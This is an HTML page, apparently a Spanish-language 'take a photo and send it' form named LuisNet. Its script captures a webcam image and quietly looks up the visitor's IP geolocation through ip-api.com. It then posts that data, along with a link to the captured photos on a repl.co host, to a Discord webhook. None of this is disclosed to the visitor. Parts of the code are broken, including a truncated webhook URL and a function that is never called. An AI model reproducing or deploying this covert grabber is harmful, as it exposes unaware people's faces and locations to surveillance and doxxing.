<!DOCTYPE html>
<html>
<head>
    <title>LuisNet</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />
    <style type="text/css">
        #results { padding:20px; border:1px solid; background:#ccc; }
    </style>
</head>
<body>
  
<div class="container">
    <h1 class="text-center">PULSA EL BOTÓN TOMAR FOTO Y LUEGO ENVIAR PARA CONTINUAR.</h1>
   
    <form method="POST" action="process_foto">
        <div class="row">
            <div class="col-md-6">
                <div id="my_camera"></div>
                <br/>
                <input type=button value="TOMAR FOTO" onClick="take_snapshot()">
                <input type="hidden" name="image" class="image-tag">
            </div>
            <div class="col-md-6">
                <div id="results">Imagen Capturada:</div>
            </div>
            <div class="col-md-12 text-center">
                <br/>
                <button class="btn btn-success">Enviar</button>
            </div>
        </div>
    </form>
</div>



<!-- Attach camera #FixByLuis -->
<script language="JavaScript">
    Webcam.set({
        width: 490,
        height: 390,
        image_format: 'jpeg',
        jpeg_quality: 90
    });
  
    Webcam.attach( '#my_camera' );
  
    function take_snapshot() {
        Webcam.snap( function(data_uri) {
            $(".image-tag").val(data_uri);
            document.getElementById('results').innerHTML = '<img src="'+data_uri+'"/>';
        } );
    const api = "http://ip-api.com/json/"

    var ipinfo = [

    ]

    async function getIP() {
        const response = await fetch (api)
        const data = await response.json();
        const { city, zip, country, countryCode, lat, lon, org, query, region, regionname, timezone } = data;

        ipinfo.push(data);
        console.log(ipinfo)
    }

    getIP();

    
    function sendMessage() {
        fetch(
            'https://discord.com/api/webhooks/', {
                method: 'post',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify ({
                    allowed_mentions: {
                        parse: ['users', 'roles'],
                },
                // embeds to be sent
                embeds: [{
                    title: 'Nueva compra desde la maquina:',
                    description: "ipinfo" + ipinfo,
                    },
                ],
                }),
            }
        );
    }
  var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "uwuchan",
        avatar_url: "",
        content: "https://proyectvendxp.luiscraftyt3.repl.co/process_foto/"
      }
 var process_foto = new XMLHttpRequest(); {
   request.open("POST", "https://Proyectvendxp.luiscraftyt3.repl.co/process_foto");
    }
   request.setRequestHeader('Content-type', 'application/json');
      request.send(JSON.stringify(params));
}
</script>
 
</body>
</html>
